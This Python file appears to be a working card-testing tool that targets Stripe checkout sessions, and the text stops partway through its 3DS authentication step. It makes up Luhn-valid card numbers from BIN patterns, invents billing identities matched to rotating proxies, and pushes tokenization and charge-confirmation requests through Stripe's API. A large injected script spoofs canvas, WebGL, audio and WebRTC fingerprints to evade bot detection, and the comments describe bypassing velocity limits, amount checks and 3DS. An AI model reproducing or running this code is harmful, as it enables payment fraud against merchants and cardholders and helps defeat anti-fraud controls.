import re
import json
import time
import random
import asyncio
import requests
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional
import aiohttp
from curl_cffi import requests as cffi_requests
from dotenv import load_dotenv
import math
import numpy as np
from scipy.interpolate import interp1d

load_dotenv()

# ============= CONFIGURATION =============
MAX_ATTEMPTS = 10
CONCURRENT_BATCH_SIZE = 10  # Worker pool size
BATCH_DELAY = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

STRIPE_DECLINE_CODES = {
    "generic_decline": "Card declined by issuer",
    "incorrect_cvv": "CVV verification failed",
    "insufficient_funds": "Insufficient funds",
    "expired_card": "Card has expired",
    "incorrect_number": "Invalid card number",
    "invalid_cvc": "Invalid security code",
    "do_not_honor": "Transaction declined by bank",
    "fraudulent": "Fraud detection triggered",
    "lost_card": "Card reported lost",
    "stolen_card": "Card reported stolen",
    "processing_error": "Processor error",
    "authentication_required": "3DS required",
    "card_declined": "Card declined",
    "rate_limit": "Too many attempts - Slow down",
    "transaction_not_allowed": "Transaction not allowed"
}

# ============= STRIPE API EXTRACTOR =============

class StripeAPIExtractor:
    @staticmethod
    def extract_cs_live(url: str, html: str) -> Optional[str]:
        patterns = [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']
        for pattern in patterns:
            match = re.search(pattern, url)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
        return match.group(0) if match else None
    
    @staticmethod
    def extract_pk_live(html: str) -> Optional[str]:
        patterns = [r'pk_[a-z]+_[a-zA-Z0-9]+', r'"publishableKey":"(pk_[a-z]+_[a-zA-Z0-9]+)"', r'data-stripe-publishable-key="(pk_[a-z]+_[a-zA-Z0-9]+)"']
        for pattern in patterns:
            match = re.search(pattern, html)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        return None
    
    @staticmethod
    async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str) -> Dict:
        try:
            url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
            headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": random.choice(USER_AGENTS)}
            data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "America/New_York", "redirect_type": "url"}
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                proxies = {"http": proxy_url, "https": proxy_url}
                
            loop = asyncio.get_event_loop()
            response = await loop.run_in_executor(None, lambda: requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5))
            if response.status_code == 200:
                resp_json = response.json()
                amount = None
                merchant = "Unknown"
                lig = resp_json.get('line_item_group')
                if lig and isinstance(lig, dict) and lig.get('total') is not None:
                    amount = lig['total']
                elif resp_json.get('amount') is not None:
                    amount = resp_json['amount']
                elif resp_json.get('payment_intent') and isinstance(resp_json.get('payment_intent'), dict) and resp_json['payment_intent'].get('amount') is not None:
                    amount = resp_json['payment_intent']['amount']
                else:
                    def _find_amount(d):
                        if isinstance(d, dict):
                            for k in ['amount_total', 'amount_due']:
                                if k in d and isinstance(d[k], int): return d[k]
                            for v in d.values():
                                res = _find_amount(v)
                                if res is not None: return res
                        elif isinstance(d, list):
                            for item in d:
                                res = _find_amount(item)
                                if res is not None: return res
                        return None
                    amount = _find_amount(resp_json)
                    
                acct = resp_json.get('account_settings')
                if acct and isinstance(acct, dict) and acct.get('display_name'):
                    merchant = acct['display_name']
                elif resp_json.get('statement_descriptor'):
                    merchant = resp_json['statement_descriptor']
                    
                currency = resp_json.get('currency', 'usd').upper()
                
                locked_email = None
                if resp_json.get('customer_email'): locked_email = resp_json['customer_email']
                elif resp_json.get('prefilled_email'): locked_email = resp_json['prefilled_email']
                elif isinstance(resp_json.get('customer'), dict) and resp_json['customer'].get('email'): locked_email = resp_json['customer']['email']
                elif isinstance(resp_json.get('customer_details'), dict) and resp_json['customer_details'].get('email'): locked_email = resp_json['customer_details']['email']
                
                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'locked_email': locked_email}
            return {'success': False}
        except: return {'success': False}


# ============= BASE AUTOFILL =============
class ProxyManager:
    db_pool = None

    @classmethod
    async def init_db(cls, db_pool):
        cls.db_pool = db_pool

    @classmethod
    async def get_user_proxies(cls, user_id: int) -> List[Dict]:
        if not cls.db_pool: return []
        async with cls.db_pool.acquire() as conn:
            row = await conn.fetchrow("SELECT proxies FROM user_proxies WHERE user_id = $1", user_id)
            if row and row['proxies']:
                return json.loads(row['proxies'])
            return []

    @classmethod
    async def get_all_users(cls) -> List[int]:
        if not cls.db_pool: return []
        async with cls.db_pool.acquire() as conn:
            rows = await conn.fetch("SELECT user_id FROM user_proxies")
            return [row['user_id'] for row in rows]

    @classmethod
    async def save_user_proxies(cls, user_id: int, proxies: List[Dict]):
        if not cls.db_pool: return
        async with cls.db_pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO user_proxies (user_id, proxies)
                VALUES ($1, $2)
                ON CONFLICT (user_id) DO UPDATE SET proxies = EXCLUDED.proxies
            """, user_id, json.dumps(proxies))

    @classmethod
    async def load(cls, user_id: int, raw_text: str) -> int:
        pool = await cls.get_user_proxies(user_id)
            
        lines = [line.strip() for line in raw_text.split('\n') if line.strip()]
        added = 0
        for line in lines:
            prefix = "http://"
            raw_line = line
            if line.lower().startswith("socks5://"):
                prefix = "socks5://"
                line = line[9:]
            elif line.lower().startswith("http://"):
                prefix = "http://"
                line = line[7:]
                
            parts = line.split(':')
            if len(parts) == 4:
                p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
                pool.append(p)
                added += 1
            elif len(parts) == 2:
                p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}"}
                pool.append(p)
                added += 1
        if added > 0:
            await cls.save_user_proxies(user_id, pool)
        return added

    @classmethod
    async def get_random(cls, user_id: int) -> Optional[Dict]:
        pool = await cls.get_user_proxies(user_id)
        if not pool:
            return None
        return random.choice(pool)
        
    @classmethod
    async def remove(cls, user_id: int, proxy_raw: str):
        pool = await cls.get_user_proxies(user_id)
        new_pool = [p for p in pool if p['raw'] != proxy_raw]
        if len(new_pool) != len(pool):
            await cls.save_user_proxies(user_id, new_pool)
        
    @classmethod
    async def clear(cls, user_id: int):
        await cls.save_user_proxies(user_id, [])

    @classmethod
    async def get_count(cls, user_id: int) -> int:
        pool = await cls.get_user_proxies(user_id)
        return len(pool)
        
    @classmethod
    async def has_proxies(cls, user_id: int) -> bool:
        return await cls.get_count(user_id) > 0

    @classmethod
    def format_for_playwright(cls, proxy_data: Dict) -> Dict:
        playwright_proxy = {"server": proxy_data["server"]}
        if "username" in proxy_data:
            playwright_proxy["username"] = proxy_data["username"]
            playwright_proxy["password"] = proxy_data["password"]
        return playwright_proxy

# ============= RANDOM DATA =============
class RandomData:
    FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
                   "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen"]
    LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    STREETS = ["Main St","Oak Ave","Maple Rd","Pine Ln","Cedar Dr","Elm St","Washington Blvd","Lake Shore Dr"]
    CITIES = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","San Antonio","San Diego"]
    STATES = ["CA","NY","TX","FL","IL","PA","OH","GA","NC","MI"]
    ZIP_CODES = ["10001","90210","60601","77001","85001","19101","78201","92101"]
    
    @staticmethod
    def get_name(): return f"{random.choice(RandomData.FIRST_NAMES)} {random.choice(RandomData.LAST_NAMES)}"
    @staticmethod
    def get_email(): return f"dlx{random.randint(1000,99999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
    @staticmethod
    def get_phone(): return f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
    @staticmethod
    async def get_address_and_timezone(proxy_url: Optional[str] = None):
        timezone_id = 'America/New_York'
        address = {"line1": f"{random.randint(100,9999)} {random.choice(RandomData.STREETS)}",
                "city": random.choice(RandomData.CITIES),
                "state": random.choice(RandomData.STATES),
                "zip": random.choice(RandomData.ZIP_CODES),
                "country": "US"}
                
        # Dynamic Proxy IP Geolocation Mapping
        if proxy_url:
            try:
                # Use a fast, free geolocation API through the proxy to find its exact physical timezone
                async with aiohttp.ClientSession() as session:
                    async with session.get("http://ip-api.com/json/", proxy=proxy_url, timeout=3) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if data.get("timezone"):
                                timezone_id = data["timezone"]
                            # Bonus: We also sync the billing address city/state to match the IP perfectly!
                            if data.get("city"): address["city"] = data["city"]
                            if data.get("region"): address["state"] = data["region"]
                            
                            new_country = data.get("countryCode")
                            new_zip = str(data.get("zip", "")).strip()
                            
                            if new_country:
                                valid_zip = new_zip and len(new_zip) >= 3 and new_zip.lower() not in ['na', 'none', 'null', '0', '00', '000']
                                
                                fallbacks = {
                                    "US": random.choice(RandomData.ZIP_CODES), "GB": "SW1A 1AA", "CA": "M5V 2L7", "AU": "2000",
                                    "FR": "75001", "DE": "10115", "IT": "00118", "ES": "28001",
                                    "BR": "01000-000", "MX": "06000", "IN": "110001", "JP": "100-0001",
                                    "SG": "018956", "AE": "00000", "CH": "1000", "NL": "1011 AB",
                                    "SE": "111 22", "NO": "0150", "DK": "1000", "FI": "00100",
                                    "AT": "1010", "BE": "1000", "PT": "1000-001", "NZ": "1010"
                                }
                                
                                if valid_zip:
                                    address["country"] = new_country
                                    address["zip"] = new_zip.split('-')[0] if new_country == "US" else new_zip
                                elif new_country in fallbacks:
                                    address["country"] = new_country
                                    address["zip"] = fallbacks[new_country]
                                # If no valid zip and no fallback, we intentionally do NOT update the country.
                                # Leaving it as US with a guaranteed valid US zip prevents Stripe API format rejection.
            except: pass
            
        # Map country to locale
        locales = {
            "US": "en-US", "GB": "en-GB", "CA": "en-CA", "AU": "en-AU", 
            "FR": "fr-FR", "DE": "de-DE", "ES": "es-ES", "IT": "it-IT",
            "JP": "ja-JP", "BR": "pt-BR", "MX": "es-MX", "IN": "en-IN",
            "NL": "nl-NL", "RU": "ru-RU", "KR": "ko-KR", "CN": "zh-CN",
            "SE": "sv-SE", "TR": "tr-TR", "ZA": "en-ZA", "SG": "en-SG"
        }
        locale = locales.get(address["country"], "en-US")
        
        return address, timezone_id, locale

# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def luhn(card: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d*2))
        return checksum % 10
    
    @staticmethod
    def generate(bin_pattern: str) -> Optional[Dict]:
        if not bin_pattern: return None
        parts = bin_pattern.split('|')
        bin_clean = re.sub(r'[^0-9xX]','',parts[0])
        is_amex = bin_clean.startswith(('34','37'))
        target_len = 15 if is_amex else 16
        cvv_len = 4 if is_amex else 3
        card = ''
        for c in bin_clean:
            card += str(random.randint(0,9)) if c.lower()=='x' else c
        remaining = target_len - len(card) - 1
        for _ in range(remaining): card += str(random.randint(0,9))
        for i in range(10):
            if CardGenerator.luhn(card+str(i))==0:
                full_card = card+str(i)
                break
        else: full_card = card+'0'
        if len(full_card) != target_len: full_card = full_card.ljust(target_len,'0')
        month = parts[1].zfill(2) if len(parts)>1 and parts[1].lower()!='xx' else f"{random.randint(1,12):02d}"
        year = parts[2].zfill(2) if len(parts)>2 and parts[2].lower()!='xx' else f"{datetime.now().year+random.randint(1,5):02d}"
        cvv = parts[3] if len(parts)>3 and parts[3].lower() not in ('xxx','xxxx') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
        return {'card':full_card, 'month':month, 'year':year, 'cvv':cvv}



# ============= AUTOFILL ENGINES =============
HARDWARE_SPOOF_SCRIPT = """
    Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
    window.chrome={runtime:{}};
    
    // Emulate Modern Flagship Mobile Hardware Capabilities
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 }); // Octa-core CPU
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 }); // 8GB RAM
    Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5 }); // 5-finger multi-touch
    
    // Emulate Battery
    navigator.getBattery = async () => ({
        charging: false,
        chargingTime: Infinity,
        dischargingTime: 8400,
        level: 0.85 + (Math.random() * 0.1),
        addEventListener: () => {}
    });
    
    // Emulate Gyroscope/Accelerometer permission
    navigator.permissions.query = new Proxy(navigator.permissions.query, {
        apply: async (target, thisArg, args) => {
            if (args[0].name === 'accelerometer' || args[0].name === 'gyroscope') {
                return { state: 'granted', onchange: null };
            }
            return Reflect.apply(target, thisArg, args);
        }
    });
    
    // Simulating natural device vibration API
    navigator.vibrate = (pattern) => true;
    
    // Spoofing Gyroscope movement (simulates a human holding a phone)
    setInterval(() => {
        try {
            const motionEvent = new Event('devicemotion');
            motionEvent.acceleration = { x: Math.random() * 0.01, y: Math.random() * 0.01, z: 9.81 + (Math.random() * 0.01) };
            motionEvent.rotationRate = { alpha: Math.random() * 0.1, beta: Math.random() * 0.1, gamma: Math.random() * 0.1 };
            window.dispatchEvent(motionEvent);
        } catch(e) {}
    }, 50);
    
    // Exact Viewport/Screen Synchronization
    Object.defineProperty(window.screen, 'colorDepth', { get: () => 32 });
    Object.defineProperty(window.screen, 'pixelDepth', { get: () => 32 });
    Object.defineProperty(window.screen, 'width', { get: () => 390 });
    Object.defineProperty(window.screen, 'height', { get: () => 844 });
    Object.defineProperty(window.screen, 'availWidth', { get: () => 390 });
    Object.defineProperty(window.screen, 'availHeight', { get: () => 844 });
    Object.defineProperty(window, 'outerWidth', { get: () => 390 });
    Object.defineProperty(window, 'outerHeight', { get: () => 844 });
    
    // Block WebRTC IP Leaks (Silent Bypass)
    Object.defineProperty(navigator, 'mediaDevices', { value: undefined, configurable: false, writable: false });
    const FakeRTC = function() {
        this.createDataChannel = () => ({});
        this.createOffer = () => Promise.resolve({ sdp: '', type: 'offer' });
        this.setLocalDescription = () => Promise.resolve();
        this.close = () => {};
        this.addEventListener = () => {};
        this.localDescription = { sdp: '' };
        this.iceConnectionState = 'new';
    };
    window.RTCPeerConnection = FakeRTC;
    window.webkitRTCPeerConnection = FakeRTC;
    
    // Canvas Fingerprint Poisoning (Cloudflare/Datadome bypass)
    const originalGetContext = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function(type, ...args) {
        const context = originalGetContext.apply(this, [type, ...args]);
        if (type === '2d') {
            const originalFillText = context.fillText;
            context.fillText = function(...args) {
                args[1] += (Math.random() - 0.5) * 0.02; // Subpixel noise
                return originalFillText.apply(this, args);
            };
            const originalGetImageData = context.getImageData;
            context.getImageData = function(...args) {
                const imageData = originalGetImageData.apply(this, args);
                // Math noise on 5 random pixels completely mutates SHA-256 fingerprint hash
                for(let i=0; i<5; i++) {
                    const idx = Math.floor(Math.random() * (imageData.data.length / 4)) * 4;
                    imageData.data[idx] = (imageData.data[idx] + 1) % 255;
                }
                return imageData;
            };
            
            // Font Metric Poisoning (measureText)
            // Bots measure text width to the thousandth decimal to fingerprint OS font smoothing engines.
            // We inject 0.0001% variance to spoof a unique subpixel rendering engine.
            const originalMeasureText = context.measureText;
            context.measureText = function(...args) {
                const metrics = originalMeasureText.apply(this, args);
                if (metrics && metrics.width) {
                    Object.defineProperty(metrics, 'width', {
                        value: metrics.width + (Math.random() - 0.5) * 0.001,
                        configurable: true
                    });
                }
                return metrics;
            };
        }
        return context;
    };
    
    // DOM ClientRect GPU Fractional Anti-Aliasing Spoofing
    // Headless browsers return perfectly round integers (e.g. 50.000) for element positions.
    // Real GPUs render with fractional anti-aliasing (e.g. 50.012). We inject this variance.
    const originalGetBoundingClientRect = Element.prototype.getBoundingClientRect;
    Element.prototype.getBoundingClientRect = function() {
        const rect = originalGetBoundingClientRect.apply(this);
        if(!rect) return rect;
        const randomize = (val) => val + (Math.random() - 0.5) * 0.005;
        return {
            x: randomize(rect.x),
            y: randomize(rect.y),
            width: randomize(rect.width),
            height: randomize(rect.height),
            top: randomize(rect.top),
            right: randomize(rect.right),
            bottom: randomize(rect.bottom),
            left: randomize(rect.left)
        };
    };
    
    // WebGL GPU Vendor & Renderer Spoofing
    const getParameterProxy = function (original) {
        return function (parameter) {
            // UNMASKED_VENDOR_WEBGL = 37445
            if (parameter === 37445) {
                return 'Qualcomm'; // Mobile GPU Vendor
            }
            // UNMASKED_RENDERER_WEBGL = 37446
            if (parameter === 37446) {
                return 'Adreno (TM) 740'; // Samsung Galaxy S23 Ultra GPU
            }
            return original.apply(this, [parameter]);
        };
    };
    const webgl1 = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = getParameterProxy(webgl1);
    const webgl2 = WebGL2RenderingContext.prototype.getParameter;
    WebGL2RenderingContext.prototype.getParameter = getParameterProxy(webgl2);
    
    // Audio Fingerprint Poisoning (Datadome hardware unmasking bypass)
    const audioMethods = ['createOscillator', 'createDynamicsCompressor', 'createBiquadFilter'];
    const fakeAudioContext = function(TargetContext) {
        if (!TargetContext) return;
        audioMethods.forEach(method => {
            if (TargetContext.prototype[method]) {
                const originalMethod = TargetContext.prototype[method];
                TargetContext.prototype[method] = function(...args) {
                    const node = originalMethod.apply(this, args);
                    if (method === 'createOscillator') {
                        node.type = 'triangle'; // Poison the wave shape
                        const originalStart = node.start;
                        node.start = function(...sArgs) {
                            // Introduce random frequency variance (+/- 0.05 Hz) to mutate audio SHA hash
                            if(this.frequency) {
                                this.frequency.value += (Math.random() - 0.5) * 0.1;
                            }
                            return originalStart.apply(this, sArgs);
                        };
                    }
                    return node;
                };
            }
        });
    };
    fakeAudioContext(window.OfflineAudioContext);
    fakeAudioContext(window.AudioContext);
    fakeAudioContext(window.webkitOfflineAudioContext);
    fakeAudioContext(window.webkitAudioContext);
"""

class StripeAPIHitter:
    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None):
        self.pk_live = pk_live
        self.cs_live = cs_live
        self.proxy_data = proxy_data
        self.raw_amount = raw_amount
        self.locked_email = locked_email
        
    async def hit(self, card: Dict, attempt: int, user_id: int) -> Dict:
        start = time.time()
        result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None}
        
        BROWSER_PROFILES = [
            {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "impersonate": "chrome120", "os": "Windows", "color_depth": "32", "screen_height": "1080", "screen_width": "1920"},
            {"user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "impersonate": "chrome120", "os": "MacIntel", "color_depth": "30", "screen_height": "1050", "screen_width": "1680"},
            {"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "impersonate": "chrome116", "os": "Windows", "color_depth": "24", "screen_height": "1440", "screen_width": "2560"},
        ]
        profile = random.choice(BROWSER_PROFILES)
        
        max_retries = 3
        for current_attempt in range(max_retries):
            try:
                proxy_data = self.proxy_data if current_attempt == 0 else await ProxyManager.get_random(user_id)
                proxies = None
                if proxy_data:
                    result['proxy_raw'] = proxy_data['raw']
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                    proxies = {"http": proxy_url, "https": proxy_url}

                headers = {
                    "authority": "api.stripe.com",
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://checkout.stripe.com",
                    "referer": "https://checkout.stripe.com/",
                    "user-agent": profile["user_agent"]
                }

                address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
    
                # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
                import uuid
                pm_idempotency = str(uuid.uuid4())
                confirm_idempotency = str(uuid.uuid4())
                
                # Step 0: Pure-API Telemetry Harvesting (MUID/SID)
                # [DISABLED] Sending empty telemetry to m.stripe.com simulates an adblocker,
                # which causes strict merchants like Foyer Tech to instantly throw an `rqdata` CAPTCHA.
                # telemetry_url = "https://m.stripe.com/6"
                # telemetry_headers = {
                #     "user-agent": profile["user_agent"],
                #     "content-type": "text/plain;charset=UTF-8",
                #     "origin": "https://checkout.stripe.com",
                #     "referer": "https://checkout.stripe.com/"
                # }
                # loop = asyncio.get_event_loop()
                # telemetry_res = await loop.run_in_executor(None, lambda: cffi_requests.post(telemetry_url, headers=telemetry_headers, data="", proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                # telemetry_json = telemetry_res.json() if telemetry_res.status_code == 200 else {}
                # 
                # muid = telemetry_json.get("muid") or str(uuid.uuid4())
                # sid = telemetry_json.get("sid") or str(uuid.uuid4())
    
                # Step 1: Tokenize the raw card into a PaymentMethod
                pm_url = "https://api.stripe.com/v1/payment_methods"
                pm_data = {
                    "type": "card",
                    "card[number]": card['card'],
                    "card[cvc]": card['cvv'],
                    "card[exp_month]": card['month'],
                    "card[exp_year]": card['year'],
                    "billing_details[name]": RandomData.get_name(),
                    "billing_details[email]": self.locked_email if self.locked_email else RandomData.get_email(),
                    "billing_details[address][line1]": address["line1"],
                    "billing_details[address][city]": address["city"],
                    "billing_details[address][state]": address["state"],
                    "billing_details[address][postal_code]": address["zip"],
                    "billing_details[address][country]": address["country"],
                    "payment_user_agent": "stripe.js/b60285dd61; stripe-js-v3/b60285dd61; checkout",
                    "pasted_fields": "number",
                    # "guid": muid,
                    # "muid": muid,
                    # "sid": sid,
                    "key": self.pk_live,
                }
                # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
                # [DISABLED] Initiating unverified Link sessions often triggers `rqdata` (hCaptcha) 
                # bot protection on strict merchants like Foyer Tech. It's safer to skip it.
                # link_url = "https://api.stripe.com/v1/link_account_sessions"
                # link_data = {
                #     "email": pm_data["billing_details[email]"],
                #     "key": self.pk_live,
                #     "payment_method_data[type]": "card"
                # }
                # if self.cs_live:
                #     link_data["payment_pages_checkout_session"] = self.cs_live
                #     
                # link_headers = headers.copy()
                # link_res = await loop.run_in_executor(None, lambda: cffi_requests.post(link_url, headers=link_headers, data=link_data, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                # if link_res.status_code == 200:
                #     link_json = link_res.json()
                #     if link_json.get("client_secret"):
                #         # Inject the unverified Link session into the PaymentMethod payload
                #         pm_data["link[credentials][client_secret]"] = link_json["client_secret"]
                
                pm_headers = headers.copy()
                pm_headers["Idempotency-Key"] = pm_idempotency
                
                loop = asyncio.get_event_loop()
                pm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(pm_url, headers=pm_headers, data=pm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                pm_json = pm_res.json()
                
                if 'id' not in pm_json:
                    err = pm_json.get('error', {})
                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'pm_token_failed')
                    result['error'] = err.get('message', 'Failed to generate payment method token')
                    # If we reach here without exception, do not retry!
                    return result
                    
                pm_id = pm_json['id']
                
                # Step 2: Confirm the charge using the trusted pm_ token
                confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
                confirm_data = {
                    "payment_method": pm_id,
                    "expected_payment_method_type": "card",
                    # "payment_method_options[card][request_three_d_secure]": "any",
                    "consent[terms_of_service]": "accepted",
                    "key": self.pk_live,
                }
                if self.raw_amount is not None and self.raw_amount > 0:
                    confirm_data["expected_amount"] = self.raw_amount
                
                confirm_headers = headers.copy()
                confirm_headers["Idempotency-Key"] = confirm_idempotency
                
                loop = asyncio.get_event_loop()
                confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                confirm_json = confirm_res.json()
                
                # Dynamic Amount Mismatch Bypass
                # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
                err_code = confirm_json.get('error', {}).get('code')
                err_msg = confirm_json.get('error', {}).get('message', '') or ''
                
                # Parameter Unknown Bypass
                # If Stripe rejects our injected "payment_method_options[card][request_three_d_secure]" because the specific 
                # checkout link does not support it (e.g. basic SetupIntents or strict PaymentIntents), we must delete it and retry.
                if confirm_res.status_code == 400 and err_code == 'parameter_unknown' and 'payment_method_options' in err_msg:
                    del confirm_data['payment_method_options[card][request_three_d_secure]']
                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                    confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                    confirm_json = confirm_res.json()
                    err_code = confirm_json.get('error', {}).get('code')
                    err_msg = confirm_json.get('error', {}).get('message', '') or ''
                
                # Unified Amount Mismatch Bypass
                if confirm_res.status_code != 200 and (err_code == 'checkout_amount_mismatch' or 'expected amount' in err_msg.lower() or 'expected_amount' in err_msg):
                    # Stripe's error message usually contains the correct expected amount: 
                    # e.g., "The expected amount (2000) does not match the actual amount (0)."
                    import re
                    match = re.search(r'actual amount \((\d+)\)', err_msg.lower())
                    if match:
                        confirm_data['expected_amount'] = int(match.group(1))
                    else:
                        # Fallback to 0 for SetupIntents / Free Trials if regex fails
                        confirm_data['expected_amount'] = 0
                        
                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
                    confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                    confirm_json = confirm_res.json()
                
                result['response_time'] = time.time() - start
                
                if confirm_res.status_code == 200:
                    pi = confirm_json.get('payment_intent', {})
                    si = confirm_json.get('setup_intent', {})
                    intent_id = pi.get('id') if isinstance(pi, dict) and pi.get('id') else (si.get('id') if isinstance(si, dict) else None)
                    client_secret = pi.get('client_secret') if isinstance(pi, dict) and pi.get('client_secret') else (si.get('client_secret') if isinstance(si, dict) else None)
                    is_setup_intent = bool(si) or (isinstance(intent_id, str) and 'seti' in intent_id)
                    
                    if isinstance(pi, dict) and pi.get('last_payment_error'):
                        err = pi.get('last_payment_error')
                        result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                        result['error'] = err.get('message', 'Unknown error')
                        return result
                        
                    if isinstance(si, dict) and si.get('last_setup_error'):
                        err = si.get('last_setup_error')
                        result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                        result['error'] = err.get('message', 'Unknown error')
                        return result
    
                    status = confirm_json.get('status')
                    next_action = confirm_json.get('next_action', {})
                    if isinstance(pi, dict):
                        if pi.get('status'): status = pi.get('status')
                        if pi.get('next_action'): next_action = pi.get('next_action')
                    elif isinstance(si, dict):
                        if si.get('status'): status = si.get('status')
                        if si.get('next_action'): next_action = si.get('next_action')
                        
                    if status in ['succeeded', 'requires_capture', 'complete']:
                        result['success'] = True
                        return result
                    elif status == 'requires_action':
                        try:
                            state = None
                            res = confirm_json.get('payment_intent') or confirm_json.get('setup_intent') or confirm_json
                            pk = self.pk_live
                            pi = intent_id
                            taken = time.time() - start
                            
                            session = requests.Session()
                            if proxies:
                                session.proxies = proxies

                            if res.get("status") == "requires_action":
                                next_action = res.get("next_action", {})
                                sdk = next_action.get("use_stripe_sdk", {})
                                source = (
                                    sdk.get("three_d_secure_2_source")
                                    or sdk.get("source")
                                    or next_action.get("source")
                                )
                                state = None

                                if source:
                                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                    auth_headers = {
                                        "accept": "application/json",
                                        "content-type": "application/x-www-form-urlencoded",
                                        "origin": "https://js.stripe.com",
                                        "referer": "https://js.stripe.com/",
                                        "user-agent": "Mozilla/5.0 (Linux; Android 10)"
                                    }
                                    browser = {
                                        "fingerprintAttempted": True,
                                        "fingerprintData": None,
                                        "challengeWindowSize": None,
                                        "threeDSCompInd": "Y",
                                        "browserJavaEnabled": False,
                                        "browserJavascriptEnabled": True,
                                        "browserLanguage": "en-US",
                                        "browserColorDepth": "24",
                                        "browserScreenHeight": "873",
                                        "browserScreenWidth": "393",
                                        "browserTZ": "-300",
                                        "browserUserAgent": auth_headers["user-agent"]
                                    }
                                    auth_data = {
                                        "source": source,
                                        "browser": json.dumps(browser),
                                        "one_click_authn_device_support[hosted]": "false",
                                        "one_click_authn_device_support[same_origin_frame]": "false",
                                        "one_click_authn_device_support[spc_eligible]": "false",
                                        "one_click_authn_device_support[webauthn_eligible]": "false",
                                        "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                                        "key": pk
                                    }

                                    auth_resp = session.post(auth_url, headers=auth_headers, data=auth_data, timeout=30)
                                try:
